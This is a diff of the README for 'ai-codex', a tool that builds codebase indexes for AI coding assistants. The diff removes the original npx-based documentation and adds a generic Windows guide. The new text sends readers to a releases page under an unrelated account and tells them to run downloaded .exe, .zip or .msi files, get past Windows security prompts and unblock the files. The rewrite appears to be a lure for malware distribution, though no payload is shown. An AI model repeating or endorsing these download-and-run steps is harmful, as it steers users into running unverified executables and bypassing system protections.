@@ -1,222 +1,160 @@
-# ai-codex
+# 🤖 ai-codex - Build a clean code index fast
 
-[![Built by Claude Code](https://img.shields.io/badge/Built%20by-Claude%20Code-blueviolet?logo=anthropic)](https://claude.ai/code)
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-blue.svg)](https://www.typescriptlang.org/)
+[![Download](https://img.shields.io/badge/Download%20ai-codex-4c6ef5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Extensive-doctorfish372/ai-codex/releases)
 
-> **This project was entirely designed, written, and published by [Claude Code](https://claude.ai/code) (Anthropic's AI coding assistant).** The concept, implementation, documentation, and examples were all generated in a single conversation session.
+## 🧭 What ai-codex does
 
-Generate a compact codebase index that gives AI coding assistants instant context about your project structure. Instead of wasting 50K+ tokens on file exploration at the start of every conversation, your AI assistant reads a pre-built index and gets to work immediately.
+ai-codex creates a compact index of your codebase for AI tools. It helps you share the shape of a project without sending every file. That can save a large number of tokens in each chat and make answers easier to keep on track.
 
-## Why
+Use it when you want to:
+- give Claude, Cursor, or other AI tools a clear map of a project
+- keep context small
+- work with large folders without pasting full source files
+- reduce repeat explanation of file structure
 
-Every time you start a conversation with an AI coding assistant (Claude Code, Cursor, GitHub Copilot, etc.), it spends thousands of tokens exploring your codebase -- reading files, scanning directories, building a mental model. This happens **every single conversation**.
+## 💻 What you need
 
-`ai-codex` solves this by generating compact, structured reference files that capture:
-- Every API route with its HTTP methods
-- Every page with its rendering strategy (client vs. server)
-- Every library function signature
-- Your database schema (key fields, relationships)
-- Your component tree with props
+- Windows 10 or Windows 11
+- A web browser
+- Permission to download and run apps
+- A codebase or folder you want to index
 
-The result: **5 small files** that replace 50K+ tokens of exploration, every time.
+## 📥 Download ai-codex
 
-## Quick Start
+Visit this page to download the Windows release:
 
-Run it in your project root:
+[Download ai-codex from GitHub Releases](https://github.com/Extensive-doctorfish372/ai-codex/releases)
 
-```bash
-npx ai-codex
-```
+After the page opens, look for the latest release and download the Windows file if one is listed. Save it to a place you can find, like Downloads or Desktop.
 
-That's it. It auto-detects your framework and generates the index.
+## 🚀 Install and start
 
-## Output
+1. Open the downloaded file.
+2. If Windows shows a security prompt, choose the option that lets you run the app.
+3. If the file came in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
 
-By default, files are written to `.ai-codex/` in your project root:
+If the app opens in a terminal window, let it finish loading. If it opens with a simple window, wait for the main screen to appear.
 
-| File | What it contains |
-|------|-----------------|
-| `routes.md` | API routes grouped by resource, with HTTP methods |
-| `pages.md` | Page tree with client/server rendering tags |
-| `lib.md` | Library exports -- function signatures, classes |
-| `schema.md` | Database schema -- key fields, FKs, relationships |
-| `components.md` | Component index with props, grouped by feature |
+## 🗂️ Use ai-codex
 
-Files that don't apply are skipped (e.g., no `schema.md` if you don't use Prisma).
+1. Start ai-codex.
+2. Pick the folder you want to index.
+3. Let the app scan the files.
+4. Create the codebase index.
+5. Copy the result into your AI chat or tool.
 
-## Configuration
+A good folder is one that holds a real project, such as:
+- a Next.js app
+- a TypeScript project
+- a tool you use with Claude or Cursor
+- a full app with folders like `src`, `app`, `pages`, or `components`
 
-### CLI Flags
+## ⚙️ What the index includes
 
-```bash
-npx ai-codex --output .claude/codex     # custom output directory
-npx ai-codex --include src lib           # only scan these directories
-npx ai-codex --exclude tests __mocks__   # skip these directories
-npx ai-codex --schema prisma/schema.prisma  # explicit schema path
-```
+ai-codex builds a short, useful view of your project. It can include:
 
-### Config File
+- file names and folder names
+- main parts of the app
+- common entry files
+- project structure
+- short notes that help an AI understand the codebase
 
-Create a `codex.config.json` in your project root:
+This helps an AI answer with the right parts of the project in mind, without reading every file.
 
-```json
-{
-  "output": ".ai-codex",
-  "include": ["src", "lib", "app"],
-  "exclude": ["tests", "__mocks__"],
-  "schema": "prisma/schema.prisma"
-}
-```
+## 🧠 Best ways to use it
 
-CLI flags override config file values.
+- Run it before asking an AI to edit code
+- Use it when the project is too large to paste into chat
+- Refresh the index after large changes
+- Share the index with Claude, Claude Code, or Cursor for better context
+- Keep one index per project branch if you switch often
 
-## Output Format Examples
+## 🛠️ Common setup tips
 
-### routes.md
-```
-## products
-GET,POST     /api/products [auth,db]
-GET,PUT,DELETE /api/products/:id [auth,db]
-POST         /api/products/:id/images [auth]
+If Windows blocks the app:
+- Right-click the file
+- Choose Properties
+- Check for an Unblock option
+- Click Apply
+- Open the app again
 
-## orders
-GET,POST     /api/orders [auth,db]
-GET          /api/orders/:id [auth,db]
-POST         /api/orders/:id/refund [auth,db]
-```
+If the file does not open:
+- Make sure the download finished
+- Check that you opened the correct release file
+- Try extracting the ZIP file first
+- Run the app from the extracted folder
 
-### pages.md
-```
-[client]   /                                                  HomePage
-[server]   /products                                          ProductsPage
-[client]   /products/:id                                      ProductDetailPage
-[server]   /cart                                               CartPage
-[client]   /checkout                                           CheckoutPage
-```
+If the app cannot read your folder:
+- Move the project to a simple path like `C:\Projects\MyApp`
+- Avoid folders with very long names
+- Close other apps that may lock files
 
-### lib.md
-```
-## lib
-cart-utils.ts
-  fn calculateTotal
-  fn applyDiscount
-  fn formatPrice
-auth.ts  fn validateSession
-stripe.ts  fn createPaymentIntent
-```
+## 📁 Good folder layout for indexing
 
-### schema.md
-```
-## Product
-  id                     String    PK
-  categoryId             String
-  -> Category, OrderItem[], Review[]
+ai-codex works best when your project has a clear structure, such as:
 
-**Order** id(PK) | userId | status -> User, OrderItem[]
-**User** id(PK) | email(UQ) -> Order[], Review[]
-```
+- `src`
+- `app`
+- `pages`
+- `components`
+- `lib`
+- `public`
+- `tests`
 
-### components.md
-```
-## components
-(c) CartDrawer  items, onRemove, onCheckout
-(c) ProductCard  product, onAddToCart
-    PriceDisplay  amount, currency
-(c) SearchBar  onSearch, placeholder
-```
+A clean layout helps the index stay short and easy to read. It also helps AI tools find the main parts faster.
 
-## Integration with AI Assistants
+## 🧰 Example use cases
 
-### Claude Code
+- You want Claude to understand a Next.js app before editing a page
+- You want Cursor to see the file map before making changes
+- You want a compact project view before asking for bug fixes
+- You want to explain a TypeScript codebase without pasting full files
+- You want to keep token use low in long chat sessions
 
-Add this to your `CLAUDE.md`:
+## 🔎 Topics covered
 
-```markdown
-## Codebase Index
-Pre-built index files are in `.ai-codex/`. Read these FIRST before exploring the codebase:
-- `.ai-codex/routes.md` -- all API routes
-- `.ai-codex/pages.md` -- page tree
-- `.ai-codex/lib.md` -- library exports
-- `.ai-codex/schema.md` -- database schema
-- `.ai-codex/components.md` -- component tree
-```
+- ai-coding
+- claude
+- claude-code
+- codebase-index
+- cursor
+- developer-tools
+- llm-tools
+- nextjs
+- token-optimization
+- typescript
 
-### Cursor / Other AI IDEs
+## 🧭 How to get the best result
 
-Add the `.ai-codex/` directory to your AI assistant's context or rules file. Most AI coding tools support a way to include reference files.
+- Index the whole app, not one small file
+- Keep file names clear and short
+- Remove build output folders before indexing
+- Run the tool again after big changes
+- Use the index as the first thing you share with an AI assistant
 
-## Auto-Refresh
+## 📦 Simple workflow
 
-### Git Pre-Commit Hook
+1. Download the app from GitHub Releases.
+2. Open it on Windows.
+3. Choose your project folder.
+4. Generate the codebase index.
+5. Paste the result into your AI tool.
 
-```bash
-# .git/hooks/pre-commit
-npx ai-codex
-git add .ai-codex/
-```
+## 🖱️ Need the download again?
 
-### npm Script
+[Open the ai-codex releases page](https://github.com/Extensive-doctorfish372/ai-codex/releases)
 
-```json
-{
-  "scripts": {
-    "codex": "npx ai-codex",
-    "precommit": "npx ai-codex && git add .ai-codex/"
-  }
-}
-```
+## 🔧 File types you may see
 
-### CI/CD
+Depending on the release, you may see files such as:
+- `.exe`
+- `.zip`
+- `.msi`
 
-```yaml
-# GitHub Actions example
-- name: Update codebase index
-  run: npx ai-codex
-- name: Commit index
-  run: |
-    git add .ai-codex/
-    git diff --cached --quiet || git commit -m "chore: update codebase index"
-```
+If you see an `.exe`, open it after download. If you see a `.zip`, extract it first. If you see an `.msi`, double-click it to start the install flow.
 
-## Supported Frameworks
+## 🧩 What makes ai-codex useful
 
-| Framework | Auto-detected | What it scans |
-|-----------|:------------:|---------------|
-| **Next.js (App Router)** | Yes | `app/` or `src/app/` (`api/**/route.ts`, `**/page.tsx`), `lib/`, `components/` |
-| **Next.js (Pages Router)** | Yes | `pages/` or `src/pages/` (`api/**/*.ts`, `**/*.tsx` excl. `_app`/`_document`/`_error`), `lib/`, `components/` |
-| **Generic TypeScript** | Yes | `src/`, `lib/`, `utils/`, `components/` |
-
-Schema sources are auto-detected from multiple ORMs:
-
-- **Prisma** at `prisma/schema.prisma` (or nested under `prisma/schema/`)
-- **Drizzle** at `db/schema.ts`, `src/db/schema.ts`, `lib/db/schema.ts`, `src/lib/db/schema.ts`, `app/db/schema.ts`, `database/schema.ts`, or `drizzle/schema.ts` — including split-file layouts where `<base>/schema/` is a directory of `.ts` files
-
-Override with `--schema <path>` for either ORM (file extension determines the parser).
-
-## What Gets Skipped
-
-- `node_modules/`, `.next/`, `dist/`, `build/`, `.git/`
-- `.d.ts` declaration files, `.map` source maps, `.min.js` minified files
-- Backup files (`*.backup.*`, `*-backup-*`)
-- shadcn/radix UI primitives (button, dialog, etc.) in `components/ui/`
-
-## Contributing
-
-1. Fork the repo
-2. Create a feature branch: `git checkout -b my-feature`
-3. Make your changes
-4. Test on a real project: `cd /path/to/your/project && npx tsx /path/to/ai-codex/src/generate-codex.ts`
-5. Submit a pull request
-
-### Ideas for Contributions
-
-- Support for more frameworks (SvelteKit, Remix, Astro)
-- Support for more ORMs (Drizzle, TypeORM, Knex)
-- Watch mode (`--watch`) for continuous regeneration
-- Token count estimation in output
-- Support for Python projects (FastAPI, Django)
-
-## License
-
-MIT
+Large codebases can fill chat limits fast. A compact codebase index keeps the shape of the project in view while cutting down on repeated text. That helps an AI focus on the parts that matter, such as the main entry points, page flow, and shared components.
